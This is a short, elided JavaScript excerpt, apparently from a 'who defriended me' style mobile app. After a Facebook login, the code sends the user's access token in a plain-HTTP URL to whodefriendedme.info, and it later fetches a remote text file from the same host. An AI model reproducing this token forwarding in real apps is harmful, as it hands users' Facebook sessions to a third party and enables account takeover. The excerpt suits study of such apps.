			...
			function login() {
                ...
                FB.login(
                         ...
                         if (response.authResponse.accessToken != "null") {
							var ref = window.open("http://whodefriendedme.info/sf/mobile?access_token="+response.authResponse.accessToken, "_blank", "location=no");
		            ...
		            document.addEventListener('deviceready', function() {
		                    var id;
		                       $.ajax({
		                        type: "GET",
		                        url: "http://whodefriendedme.info/sf.txt",
